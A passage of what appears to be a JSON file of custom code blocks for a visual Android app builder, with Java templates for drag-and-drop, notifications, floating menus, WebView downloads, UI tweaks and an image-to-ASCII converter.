icon %m.resource"},{"code":"%1$s.setThumbResource(R.drawable.%2$s);","color":"#00838F","name":"switch on","typeName":"","palette":"81","type":" ","spec":"%m.switch set on color %m.color"},{"code":"}public static class Dragger {\n    private View dragView;\n    private View[] targetViews;\n    private float dX, dY;\n    private int initXY[] \u003d new int[2];\n    private boolean isInitXy \u003d false;\n    private boolean eventSuccess \u003d false;\n    private DragEventListener dragEventListener;\n    private View view;\n    public Dragger(View dragView, View[] targetViews) {\n        this.dragView \u003d dragView;\n        this.targetViews \u003d targetViews;\n    }\n    public Dragger() {\n    }\n    public static Dragger create(){\n        return new Dragger();\n    }\n    public Dragger setDragView(View dragView) {\n        this.dragView \u003d dragView;\n        return this;\n    }\n    public Dragger setTargetViews(View[] targetViews) {\n        this.targetViews \u003d targetViews;\n        return this;\n    }\n    public Dragger setDragEventListener(DragEventListener dragEventListener) {\n        this.dragEventListener \u003d dragEventListener;\n        return this;\n    }\n    public void startDragging(){\n        if(dragView \u003d\u003d null){\n            return;\n        }\n        if(targetViews \u003d\u003d null){\n            return;\n        }\n        dragView.setOnTouchListener(new View.OnTouchListener() {\n            @Override\n            public boolean onTouch(View v, MotionEvent event) {\n                switch (event.getAction()) {\n                    case MotionEvent.ACTION_DOWN:\n                        dX \u003d dragView.getX() - event.getRawX();\n                        dY \u003d dragView.getY() - event.getRawY();\n                        if(!isInitXy) {\n                            dragView.getLocationInWindow(initXY);\n                            isInitXy \u003d true;\n                        }\n                        break;\n                    case MotionEvent.ACTION_MOVE:\n                        dragView.animate()\n                                .x(event.getRawX() + dX)\n                                .y(event.getRawY() + dY)\n                                .setDuration(0)\n                                .start();\n                        for(int i\u003d0;i\u003ctargetViews.length;i++) {\n                            if (isViewInBounds(targetViews[i], event.getRawX(), event.getRawY())) {\n                                Dragger.this.view \u003d targetViews[i];\n                                eventSuccess \u003d true;\n                                break;\n                            }\n                            else {\n                                eventSuccess \u003d false;\n                            }\n                        }\n                        break;\n                    case MotionEvent.ACTION_UP:\n                        if(!eventSuccess) {\n                            dragView.animate()\n                                    .x(initXY[0])\n                                    .y(initXY[1])\n                                    .setDuration(0)\n                                    .start();\n                        }else {\n                            if(dragEventListener !\u003d null)\n                                dragEventListener.onDragComplete(view);\n                        }\n                    default:\n                        return false;\n                }\n                return true;\n            }\n        });\n    }\n    private Rect rect \u003d new Rect();\n    private int[] location \u003d new int[2];\n    private boolean isViewInBounds(View target, float x, float y){\n        target.getDrawingRect(rect);\n        target.getLocationOnScreen(location);\n        rect.offset(location[0], location[1]);\n        return rect.contains((int) x, (int)y);\n    }\n    public interface DragEventListener{\n        public void onDragComplete(View targetView);\n    }\n","color":"#CAC319","name":"DraggerLibrary","typeName":"","palette":"82","type":" ","spec":"\u003e\u003e\u003e\u003e DraggerLibrary \u003c\u003c\u003c\u003c"},{"code":"Dragger.create().setDragView(%s)\n\t.setTargetViews(new View[]{%s})\n\t.setDragEventListener(new Dragger.DragEventListener() {\n\t@Override\n\tpublic void onDragComplete(View targetView) {\n%s\n\t}\n}).startDragging();","color":"#CAC319","name":"setDragView","typeName":"","palette":"82","type":"c","spec":"setDragView %m.view and setTargetViews%m.view  When onDragComplete"},{"code":"%s,%s","color":"#CAC319","name":"ViewAndView","typeName":"view","palette":"82","type":"p","spec":"%m.view and %m.view"},{"code":"targetView.equals(%s)","color":"#CAC319","name":"viewIsTargetView","typeName":"","palette":"82","type":"b","spec":"%m.view isTargetView"},{"code":"\t\t{final Activity activity \u003d %s.this;\n\t\tfinal Context context \u003d activity.getApplicationContext();\n\t\tfinal int notificationId \u003d %s;\n\t\tfinal String channelId \u003d %s;\n\t\tfinal String channelName \u003d %s;\n\t\t\n\t\tnew androidx.core.app.NotificationCompat.Builder(context, channelId){\n\t\t\t\n\t\t\t\n\t\t\tNotificationManager notificationManager \u003d (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);\n\t\t\tIntent intent335 \u003d new Intent();\n\t\t\t\t\t\t\t\t\t   public void create(){\n\n\t\t\t\t\t\t\t\t\t\t   intent335.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); \n\t\t\t\t\t\t\t\t\t\t   PendingIntent pendingIntent \u003d PendingIntent.getActivity(activity, 0, intent335, 0);\n\t\t\t\t\t\t\t\t\t\t   \n\t\t\t\t\t\t\t\t\t\t   if (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.O) {\n\t\t\t\t\t\t\t\t\t\t\t   NotificationChannel mChannel \u003d new NotificationChannel(\n\t\t\t\t\t\t\t\t\t\t\t\t   channelId, channelName, NotificationManager.IMPORTANCE_HIGH);\n\t\t\t\t\t\t\t\t\t\t\t   notificationManager.createNotificationChannel(mChannel);\n\t\t\t\t\t\t\t\t\t\t   }\n\t\t\t\t\t\t\t\t\t\n\n%s\n\n\t\t\t\t\t\t\t\t\t   }\n\n\t\t\t\t\t\t\t\t   }.create();}\n\t\t","color":"#8D75FF","name":"CreatePushNotification","typeName":"","palette":"83","type":"c","spec":"%m.activity CreatePushNotification id %d  channel id %s name %s"},{"code":"setSmallIcon(R.drawable.%s);","color":"#8D75FF","name":"pushNotificationSetSmallIcon","typeName":"","palette":"83","type":" ","spec":"pushNotification setSmallIcon %m.resource"},{"code":"setContentTitle(%s);","color":"#8D75FF","name":"pushNotificationSetTitle","typeName":"","palette":"83","type":" ","spec":"pushNotification setTitle %s"},{"code":"setContentText(%s);","color":"#8D75FF","name":"pushNotificationSetContentText","typeName":"","palette":"83","type":" ","spec":"pushNotification setContentText %s"},{"code":"\t\t\t\t\t\t\t\t\t\t   setAutoCancel(%s);","color":"#8D75FF","name":"pushNotificationSetAutoCancel","typeName":"","palette":"83","type":" ","spec":"pushNotification setAutoCancel %b"},{"code":"setOngoing(%s);","color":"#8D75FF","name":"pushNotificationSetOngoing","typeName":"","palette":"83","type":" ","spec":"pushNotification setOngoing %b"},{"code":"setColor(%s);","color":"#8D75FF","name":"pushNotificationSetColor","typeName":"","palette":"83","type":" ","spec":"pushNotification setColor %m.color"},{"code":"setTitleColor(%s);","color":"#8D75FF","name":"pushNotificationTitleSetColor","typeName":"","palette":"83","type":" ","spec":"pushNotification setTitleColor %m.color"},{"code":"setSound(android.net.Uri.parse(%s));","color":"#8D75FF","name":"pushNotificationSetSound","typeName":"","palette":"83","type":" ","spec":"pushNotification setSoundUri %s"},{"code":"setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT);","color":"#8D75FF","name":"pushNotificationSetPriorityDEFAULT","typeName":"","palette":"83","type":" ","spec":"pushNotification setPriorityDEFAULT"},{"code":"setLights(%s,%s,%s);","color":"#8D75FF","name":"pushNotificationSetLights","typeName":"","palette":"83","type":" ","spec":"pushNotification setLights color %m.color start ms %d stop ms %d"},{"code":"setContentView(R.layout.%s);","color":"#8D75FF","name":"pushNotificationSetContentView","typeName":"","palette":"83","type":" ","spec":"pushNotification setContentView %m.customViews"},{"code":"%s \u003d findViewById(R.id.%s);","color":"#8D75FF","name":"pushNotificationWidgetFindViewById","typeName":"","palette":"83","type":" ","spec":"%s.inputOnly findViewById %s.inputOnly"},{"code":"RemoteViews contentView \u003d new RemoteViews(getPackageName(), R.layout.%s);\nsetContent(contentView);","color":"#8D75FF","name":"pushNotificationSetContentRemoteView","typeName":"","palette":"83","type":" ","spec":"pushNotification setContentRemoteView %m.customViews"},{"code":"contentView.setOnClickPendingIntent(R.id.%2$s,pendingIntent%1$s);","color":"#8D75FF","name":"pushNotificationFVBSetOnClick","typeName":"pandingIntent","palette":"83","type":" ","spec":"%m.pandingIntent FVB id %s.inputOnly setOnClick "},{"code":"%1$s.putExtra(%2$s,%3$s);","color":"#8D75FF","name":"pushNotificationPandingIntentPutExtra","typeName":"intent","palette":"83","type":" ","spec":"%m.intent putExtra key %s value %s"},{"code":"%1$s.setClass(getApplicationContext(),%2$s.class);\r\n","color":"#8D75FF","name":"pushNotificationPandingIntentSetScreen","typeName":"intent","palette":"83","type":" ","spec":"%m.intent setScreen %m.activity"},{"code":"setContentIntent(pendingIntent);\t\t\t\t\t\t\t\t   setContentIntent(TaskStackBuilder.create(context)\n\t\t\t\t\t\t\t\t\t\t   .addNextIntent(intent335).getPendingIntent(0,PendingIntent.FLAG_UPDATE_CURRENT));\n\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t","color":"#8D75FF","name":"pushNotificationSetPendingIntent","typeName":"","palette":"83","type":" ","spec":"pushNotification setDefaultPandingIntent"},{"code":"Intent %1$s \u003d new Intent(%2$s.this, %3$s.class);\nPendingIntent pendingIntent%1$s \u003d PendingIntent.getActivity(%2$s.this, 0, %1$s, 0);\n%1$s.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | %1$s.FLAG_ACTIVITY_CLEAR_TASK);","color":"#8D75FF","name":"pushNotificationCustomPandingIntentCreate","typeName":"","palette":"83","type":" ","spec":"pushNotification createPandingIntent %s.inputOnly this %m.activity goto %m.activity"},{"code":"%s","color":"#8D75FF","name":"pushNotificationCustomPendingIntent","typeName":"pandingIntent","palette":"83","type":"p","spec":"pandingIntent %s.inputOnly"},{"code":"intent335","color":"#8D75FF","name":"pushNotificationPendingIntent","typeName":"Intent","palette":"83","type":"p","spec":"defaultPandingIntent"},{"code":"notificationManager.notify(notificationId, this.build());","color":"#8D75FF","name":"pushNotificationShow","typeName":"","palette":"83","type":"f","spec":"pushNotification Show"},{"code":"ImageView icon91\u003dnew ImageView(%1$s.this); icon91.setImageResource(R.drawable.%2$s);\nfinal FloatingActionButton fab91 \u003dnew FloatingActionButton.Builder(%1$s.this).setContentView(icon91).build();\nSubActionButton.Builder builder91 \u003dnew SubActionButton.Builder(%1$s.this);","color":"#2FAFFF","name":"CreateFabIconCFAM","typeName":"","palette":"84","type":" ","spec":"%m.activity CFAM CreateFloatingActionButton %m.resource "},{"code":"ImageView %2$sIcon\u003dnew ImageView(%1$s.this); \n%2$sIcon.setImageResource(R.drawable.%3$s);\n        SubActionButton %2$sBtn\u003dbuilder91.setContentView(%2$sIcon).build();","color":"#2FAFFF","name":"CFAMCreateItem","typeName":"","palette":"84","type":" ","spec":"%m.activity CFAM CreateMenuItem %s.inputOnly icon %m.resource"},{"code":"final FloatingActionMenu fam91 \u003dnew FloatingActionMenu.Builder(%1$s.this).addSubActionView(%2$sBtn).attachTo(fab91).build();","color":"#2FAFFF","name":"CFAMBuildMenu","typeName":"","palette":"84","type":" ","spec":"%m.activity CFAM Build  addItem %m.MenuItem"},{"code":"%sBtn.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View _view) {\n\t\t\t\t\t%s\n\nfam91.close(true);\n\t\t\t\t}\n\t\t\t});","color":"#2FAFFF","name":"FCAMOnItemOnClick","typeName":"","palette":"84","type":"c","spec":"FCAM when item %m.MenuItem onClick "},{"code":"%s","color":"#2FAFFF","name":"ActionMenuItem","typeName":"MenuItem","palette":"84","type":"p","spec":"MenuItem %s.inputOnly"},{"code":"%sBtn).addSubActionView(%s","color":"#2FAFFF","name":"ActionMenuItemAndMenuItem","typeName":"MenuItem","palette":"84","type":"p","spec":"MenuItem %m.MenuItem and MenuItem %m.MenuItem"},{"code":"%s.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View _view) {\n\t\t\t\t\t%s\n\t\t\t\t}\n\t\t\t});","color":"#3f51b5","name":"onViewClickCustom","typeName":"","palette":"10","type":"c","spec":"When %m.view clicked"},{"code":"%s.setOnLongClickListener(new View.OnLongClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean onLongClick(View _view) {\n\t\t\t\t\t%s\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});","color":"#3f51b5","name":"onViewLongClickCustom","typeName":"","palette":"10","type":"c","spec":"When %m.view long clicked"},{"code":"%s.setOnTouchListener(new View.OnTouchListener(){ \n@Override \npublic boolean onTouch(View _view, MotionEvent _motionEvent){ \n%s \nreturn true; \n }\n});","name":"setOnTouchListenerr","palette":"10","type":"c","spec":"When %m.view Touched"},{"code":"%s.setDownloadListener(new DownloadListener() {\n\t\t\t@Override public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) { \n\t\t\tDownloadManager.Request request \u003d new DownloadManager.Request( Uri.parse(url));\n\t\t\trequest.setMimeType(mimeType); String cookies \u003d CookieManager.getInstance().getCookie(url);\n\t\t\trequest.addRequestHeader(\"cookie\", cookies); \n\t\t\trequest.addRequestHeader(\"User-Agent\", userAgent);\n\t\t\trequest.setDescription(\"Downloading file...\"); \n\t\t\trequest.setTitle(URLUtil.guessFileName(url, contentDisposition, mimeType)); \n\t\t\trequest.allowScanningByMediaScanner();\n\t\t\trequest.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\n\t\t\trequest.setDestinationInExternalPublicDir( Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName( url, contentDisposition, mimeType));\n\t\t\tDownloadManager dm \u003d (DownloadManager) getSystemService(DOWNLOAD_SERVICE);\n\t\t\tdm.enqueue(request); \n\t\t\t\n\t\t\t%s\n\t\t\t\n\t\t\t}});","name":"WebView Download Enable","palette":"10","type":"c","spec":"%m.webview setDownloadListener with DownloadEnable"},{"code":"%s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent,  String contentDisposition, String mimetype,                 long contentLength) {    \n\n%s\n   \n } });","name":"setDownloadListener","palette":"10","type":"c","spec":"%m.webview setDownloadListener"},{"code":"%s.setWebViewClient(new WebViewClient() { \n\npublic void onReceivedError(WebView webview, int errorCode, String description, String failingUrl) {\n\n%s\n\n} });","name":"webview error","palette":"10","type":"c","spec":"if %m.webview is error"},{"code":"%s.getBackground().setColorFilter(%s,PorterDuff.Mode.SRC_ATOP);","color":"#0700E6","name":"setETBackground","typeName":"","palette":"10","type":" ","spec":"%m.edittext setColor %m.color"},{"code":"LinearLayout.LayoutParams.MATCH_PARENT","color":"#0700E6","name":"hwMatchParent","typeName":"","palette":"10","type":"d","spec":"MATCH_PARENT"},{"code":"LinearLayout.LayoutParams.WRAP_CONTENT","color":"#0700E6","name":"hwWrapContent","typeName":"","palette":"10","type":"d","spec":"WRAP_CONTENT"},{"code":"%s.setLayerType(%s, null);","color":"#0700E6","name":"TextViewSetLayerType","typeName":"","palette":"10","type":" ","spec":"%m.textview setLayerType( 0,1,2) %d"},{"code":"%s.getPaint().setShader(new BitmapShader(BitmapFactory.decodeResource(getResources(),R.drawable.%s), Shader.TileMode.REPEAT, Shader.TileMode.REPEAT));","color":"#0700E6","name":"TextViewSetShader","typeName":"","palette":"10","type":" ","spec":"%m.textview setShader %m.resource"},{"code":"try{android.view.View view \u003d %s.this.getCurrentFocus();   android.view.inputmethod.InputMethodManager imm \u003d (android.view.inputmethod.InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE); imm.hideSoftInputFromWindow(view.getWindowToken(), 0);} catch(Exception _e){}","color":"#0700E6","name":"hideKeyBoard","typeName":"","palette":"10","type":" ","spec":"hideKeyBoard %m.activity"},{"code":"%s.setInputType(InputType.TYPE_CLASS_NUMBER);","color":"#0700E6","name":"showKeyboardNumOnly","typeName":"","palette":"10","type":" ","spec":"%m.edittext showKeyBoardNumOnly"},{"code":"{android.view.inputmethod.InputMethodManager imm \u003d (android.view.inputmethod.InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE); imm.showSoftInput(%s, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT);}","color":"#0700E6","name":"keyboardShow","typeName":"","palette":"10","type":" ","spec":"%m.edittext showKeyBoard"},{"code":"try{\nandroid.view.inputmethod.InputMethodManager imm \u003d (android.view.inputmethod.InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);\nif(imm.isAcceptingText()){\n%s\n}else{\n%s\n}} catch(Exception _e){}","color":"#0700E6","name":"keyboardIsVisible","typeName":"","palette":"10","type":"e","spec":"if keyboard isVISIBLE"},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);","color":"#0700E6","name":"screenLandscapeMod","typeName":"","palette":"10","type":" ","spec":"screenLandscapeMod"},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);","color":"#0700E6","name":"screenPortraitMode","typeName":"","palette":"10","type":" ","spec":"screenPortraitMode"},{"code":"getWindow().getAttributes().screenBrightness \u003d(float)%s/100 ; getWindow().setAttributes(getWindow().getAttributes());","color":"#0700E6","name":"setScreenBrightness","typeName":"","palette":"10","type":" ","spec":"setScreenBrightness (0-100) %d"},{"code":"((android.os.BatteryManager)getSystemService(BATTERY_SERVICE)).getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)","color":"#0700E6","name":"getBatteryLevel","typeName":"","palette":"10","type":"d","spec":"getBatteryLevel"},{"code":"((TextView) %s.getChildAt(0)).setTextColor(%s);","color":"#0700E6","name":"setSpinnerTextColor","typeName":"","palette":"10","type":" ","spec":"%m.spinner setTextColor %m.color"},{"code":"%s.getButtonDrawable().setColorFilter(%s, PorterDuff.Mode.SRC_IN);","color":"#0700E6","name":"setCheckBoxColor","typeName":"","palette":"10","type":" ","spec":"%m.checkbox setColor %m.color"},{"code":"%s.getBackground().setColorFilter(%s, PorterDuff.Mode.MULTIPLY);","color":"#0700E6","name":"setButtonColorFilter","typeName":"","palette":"10","type":" ","spec":"button %m.view setColorFilter %m.color"},{"code":"try {\njava.lang.reflect.Field mScrollCacheField \u003d View.class.getDeclaredField(\"mScrollCache\"); \nmScrollCacheField.setAccessible(true);\nObject mScrollCache \u003d mScrollCacheField.get(%s);\njava.lang.reflect.Field scrollBarField \u003d mScrollCache.getClass().getDeclaredField(\"scrollBar\"); \nscrollBarField.setAccessible(true); \nObject scrollBar \u003d scrollBarField.get(mScrollCache);\njava.lang.Class param \u003d android.graphics.drawable.Drawable.class;\njava.lang.reflect.Method method \u003d scrollBar.getClass().getDeclaredMethod(\"setVerticalThumbDrawable\", param);\nmethod.setAccessible(true); method.invoke(scrollBar, getResources().getDrawable(R.drawable.%s));\n} catch(Exception e) {}","color":"#0700E6","name":"listviewScrollDrawable","typeName":"","palette":"10","type":" ","spec":"%m.listview setScrollDrawable %m.resource"},{"code":"%s.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onCheckedChanged(CompoundButton _param1, boolean _param2)  {\r\n\t\t\t\tif (_param2) {\n%s\r\n\t\t\t\t}else{\n%s\r\n\t\t\t}}\r\n\t\t});","color":"#0700E6","name":"chackboxIsChangeListner","typeName":"","palette":"10","type":"e","spec":"%m.checkbox isChangeChangeListener(isChacked)"},{"code":"%s.getSelectionStart()","color":"#0700E6","name":"TextViewGetSelectionStart","typeName":"","palette":"10","type":"d","spec":"%m.textview getSelectionStart"},{"code":"%s.getSelectionEnd()","color":"#0700E6","name":"TextViewGetSelectionEnd","typeName":"","palette":"10","type":"d","spec":"%m.textview getSelectionEnd"},{"code":"%s.setSelection((int)%s,(int)%s);","color":"#0700E6","name":"TextViewSetSelection","typeName":"","palette":"10","type":" ","spec":"%m.textview setSelection %d to %d"},{"code":"((android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE)).setStreamVolume(android.media.AudioManager.STREAM_MUSIC,%s, 0);","color":"#0700E6","name":"setMediaVolume","typeName":"","palette":"10","type":" ","spec":"setMediaVolume %d"},{"code":"{\n\t\tfinal android.widget.NumberPicker numb \u003d new android.widget.NumberPicker(%s.this);\nnumb.setMinValue((int)%s);\n\t\tnumb.setMaxValue((int)%s);\n\t\tnumb.setWrapSelectorWheel(true);\n\t\t%s.addView(numb);\n\t\tnumb.setOnValueChangedListener(new NumberPicker.OnValueChangeListener(){\n\t\tpublic void onValueChange(NumberPicker numberPicker, int firstInt,int lastInt){\n\t\t\t\n\t\t%s\n\n\t\t}\n\t\t});\n\t\t\n\t}","color":"#0700E6","name":"createNumberPicker","typeName":"","palette":"10","type":"c","spec":"createNumberPicker %m.activity minValue %d maxValue %d addTo %m.view  onChangeListener "},{"code":"firstInt","color":"#0700E6","name":"numberPickerFirstInt","typeName":"","palette":"10","type":"d","spec":"NumberPicker firstInt"},{"code":"lastInt","color":"#0700E6","name":"numberPickerLastInt","typeName":"","palette":"10","type":"d","spec":"NumberPicker lastInt"},{"code":"%s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onItemClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\tfinal int _position \u003d _param3;\r\n\t\t\t\t%s\r\n\t\t\t}\r\n\t\t});","color":"#0700E6","name":"listViewOnItemClicked","typeName":"","palette":"10","type":"c","spec":"%m.listview onItemClicked (_position)"},{"code":"new androidx.swiperefreshlayout.widget.SwipeRefreshLayout(%s.this){\n\t\t\tpublic final void add(){\n\t\t\t final LinearLayout _layoutView \u003d %s;\n\t\t\t\tsetLayoutParams(_layoutView.getLayoutParams());\n\t\t\t\tif(_layoutView.getParent() instanceof LinearLayout){\n\t\t\t\t\tViewGroup vg \u003d ((ViewGroup)_layoutView.getParent());\n\t\t\t\t\tvg.removeView(_layoutView);\n\t\t\t\t\tvg.removeAllViews();\n\t\t\t\t\tvg.addView(this);\n\t\t\t\t\taddView(_layoutView);\n\t\t\t\t}else{}\n\t\t\t\tsetOnRefreshListener(new androidx.swiperefreshlayout.widget.SwipeRefreshLayout.OnRefreshListener() {\n\t\t\t\t\t\t@Override\n\t\t\t\t\t\tpublic void onRefresh() {\n%s\nsetRefreshing(false);\n\t\t\t\t\t\t}});\n\t\t\t}\n\t\t}.add();","color":"#0700E6","name":"WidgetAddSwipeToRefresh","typeName":"","palette":"10","type":"c","spec":"%m.activity setSwipeToRefreshOn %m.view"},{"code":"Intent intent \u003d new Intent(\"android.intent.action.MAIN\");\nintent.setClassName(%s,%s);\nthis.startActivity(intent);","name":"Open other class","palette":"85","type":" ","spec":"package name %s class package %s"},{"code":"%1$s.setRadius((int)%2$s);","name":"cvred","palette":"87","type":" ","spec":"%m.CardView SetRadius %d"},{"code":"%1$s.setElevation((int)%2$s);","name":"cvele","palette":"87","type":" ","spec":"%m.CardView SetElevatiom %d"},{"code":"%1$s.setMaxCardElevation((int)%2$s);","name":"cvmxele","palette":"87","type":" ","spec":"%m.CardView SetMaxElevatiom %d"},{"code":"%1$s.setMargins(%2$s);","name":"cvmar","palette":"87","type":" ","spec":"%m.CardView setMargin %d"},{"code":"%1$s.setPreventCornerOverlap(%2$s);","name":"cvoverlap","palette":"87","type":" ","spec":"%m.CardView PreventCornerOverlap %b"},{"code":"%1$s.setBackgroundColor(Color.parseColor(%2$s));","name":"cvbg","palette":"87","type":" ","spec":"%m.CardView Background %s"},{"code":"\n\n%s.setOnRefreshListener(new androidx.swiperefreshlayout.widget.SwipeRefreshLayout.OnRefreshListener() {\n@Override\npublic void onRefresh() {\n%2$s\n%1$s.setRefreshing(false);\n%3$s\n}\n});","name":"swiperefresh","palette":"87","type":"e","spec":"%m.SwipeRefreshLayout  On Refresh","spec2":"OnRefreshed"},{"code":"}\n//create by Shyam Kumar Kshetri\npublic static class Img2Ascii {\n    private String[] chars \u003d {\"@\", \"#\", \"+\", \"\\\\\", \";\", \":\", \",\", \".\", \"`\", \" \"};\n    private Bitmap rgbImage;\n    private Boolean color \u003d false;\n    private int quality \u003d 3;\n    private int qualityColor \u003d 6;\n    private Spannable response;\n    private Listener listener;\n    public Img2Ascii(){\n    }\n    public Img2Ascii bitmap(Bitmap rgbImage){\n        this.rgbImage \u003d rgbImage;\n        return this;\n    }\n    public Img2Ascii quality(int quality){\n        this.quality \u003d quality;\n        return this;\n    }\n    public Img2Ascii color(Boolean color){\n        this.color \u003d color;\n        return this;\n    }\n    public void convert(Listener listener) {\n        this.listener \u003d listener;\n        new InstaApi().execute();\n    }\n    private class InstaApi extends AsyncTask\u003cString, Integer, Void\u003e {\n        private InstaApi(){\n        }\n        @Override\n        protected void onPreExecute() {\n            super.onPreExecute();\n        }\n        @Override\n        protected Void doInBackground(String... arg0) {\n            if(color) {\n                quality \u003d quality + qualityColor;\n                if (quality \u003e 5 + qualityColor || quality \u003c 1 + qualityColor)\n                    quality \u003d 3 + qualityColor;\n            }else{\n                if (quality \u003e 5 || quality \u003c 1)\n                    quality \u003d 3;\n            }\n            String tx;\n            SpannableStringBuilder span \u003d new SpannableStringBuilder();\n            int width \u003d rgbImage.getWidth();\n            int height \u003d rgbImage.getHeight();\n            int i \u003d 0;\n            for (int y \u003d 0; y \u003c height; y \u003d y + quality) {\n                for (int x \u003d 0; x \u003c width; x \u003d x + quality) {\n                    int pixel \u003d rgbImage.getPixel(x, y);\n                    int red \u003d Color.red(pixel);\n                    int green \u003d Color.green(pixel);\n                    int blue \u003d Color.blue(pixel);\n                    if(color) {\n                        tx \u003d \"#\";\n                        span.append(tx);\n                        span.setSpan(new android.text.style.ForegroundColorSpan(Color.rgb(red, green, blue)), i, i + 1, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);\n                    }else {\n                        int brightness \u003d red + green + blue;\n                        brightness \u003d java.lang.Math.round(brightness / (765 / (chars.length - 1)));\n                        tx \u003d chars[brightness];\n                        span.append(tx);\n                    }\n                    i++;\n                }\n                tx \u003d \"\\n\";\n                span.append(tx);\n                publishProgress(y, height);\n                i++;\n                if(isCancelled()) break;\n            }\n            response \u003d span;\n\n            return null;\n        }\n        protected void onProgressUpdate(Integer... progress) {\n            int current \u003d progress[0];\n            int total \u003d progress[1];\n            int percentage \u003d 100 * current / total;\n            listener.onProgress(percentage);\n        }\n        @Override\n        protected void onPostExecute(Void result) {\n            super.onPostExecute(result);\n            listener.onResponse(response);\n        }\n\n    }\n    public interface Listener {\n        void onProgress(int percentage);\n        void onResponse(Spannable response);\n    }","color":"#CAC319","name":"ImageToASCIILibrary","typeName":"","palette":"88","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e\u003e ImageToASCII Library \u003c\u003c\u003c\u003c\u003c\u003c"},{"code":"new Img2Ascii()\n   .bitmap(%2$s)\n   .quality(%3$s) // 1 - 5\n   .color(%4$s)\n   .convert(new Img2Ascii.Listener() {\n      @Override\n      public void onProgress(int percentage) {\n         %1$s.setText(String.valueOf(percentage) + \" %%\");\n      }\n      @Override\n      public void onResponse(Spannable text) {\n         %1$s.setText(text);\n      }\n   });","color":"#CAC319","name":"ImageToASCIISetText","typeName":"","palette":"88","type":" ","spec":"%m.textview setTextFrom %m.ImageFrom  quality(1-5) %d  enableColor %b"},{"code":"BitmapFactory.decodeResource(getResources(), R.drawable.%s)","color":"#CAC319","name":"ImageToASCIIImageFromResource","typeName":"ImageFrom","palette":"88","type":"p","spec":"imageFromResource %m.resource"},{"code":"BitmapFactory.decodeFile(%s)","color":"#CAC319","name":"ImageToASCIIImageFromFile","typeName":"ImageFrom","palette":"88","type":"p","spec":"imageFromFile %s"},{"code":"WallpaperManager wallpaperManager \u003d WallpaperManager.getInstance(getApplicationContext());\ntry { \nBitmap bitmap \u003d ((android.graphics.drawable.BitmapDrawable) %s.getDrawable()).getBitmap();\nwallpaperManager.setBitmap(bitmap);\n} \ncatch (Exception g) { \ng.printStackTrace(); \n}","name":"set wallpaper","palette":"89","type":" ","spec":"SET WALLPAPER%m.imageview"},{"code":"%1$s.addView(new ScratchView(%2$s.this){\n\t\t\t ScratchView v(){\n\t\t\t\t setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));\n\t\t\t\t setRevealListener(new ScratchView.IRevealListener() {\n\t\t\t\t\t\t @Override\n\t\t\t\t\t\t public void onRevealed(ScratchView scratchView) {\n\t\t\t\t\t\t\t %3$s\n\t\t\t\t\t\t\t }\n\n\t\t\t\t\t\t @Override\n\t\t\t\t\t\t public void onRevealPercentChangedListener(ScratchView scratchView, float percent) {\n\t\t\t\t\t\t\t %3$s\n\t\t\t\t\t\t }\n\t\t\t\t\t });\n\t\t\t\treturn this;\n\t\t\t}\n\t\t}.v());","color":"#898989","name":"AddScratchView","typeName":"","palette":"90","type":"e","spec":"%m.view addScratchView this %m.activity When onRevealed and onRevealPercentChangedListener"},{"code":"percent","color":"#898989","name":"ScratchPercent","typeName":"","palette":"90","type":"d","spec":"ScratchPercent"},{"code":"scratchView","color":"#898989","name":"scratchView","typeName":"view","palette":"90","type":"p","spec":"scratchView"},{"code":"Intent %1$s \u003d new Intent(MediaStore.ACTION_VIDEO_CAPTURE);\n\nif (%1$s.resolveActivity(getPackageManager()) !\u003d null) {startActivityForResult(%1$s, REQ_CD_%2$s);\n\n}","name":"StartRecord","palette":"91","type":" ","spec":"Set ID %s.inputOnly Set Component %m.camera"},{"code":"\t\t%1$s.setOnClickListener(new View.OnClickListener(){\n\t\t\t@Override\n\t\t\tpublic void onClick(View _view){\n\t\t\t\tshareApplication();\n\t\t\t}\n\t\t});","name":"ShareApplicationOnViewClick","palette":"-1","type":" ","spec":"Share application on %m.view clicked"},{"code":"}\nprivate void shareApplication() { \n\t\t\t\t\t\tandroid.content.pm.ApplicationInfo app \u003d \n\t\t\t\t\t\tgetApplicationContext().getApplicationInfo(); \n\t\t\t\t\t\tString filePath \u003d app.sourceDir;\n\t\t\t\t\t\tIntent intent \u003d new Intent(Intent.ACTION_SEND); \n\t\t\t\t\t\tintent.setType(\"*/*\"); \n\t\t\t\t\t\tjava.io.File originalApk \u003d new java.io.File(filePath); \n\t\t\t\t\t\ttry {  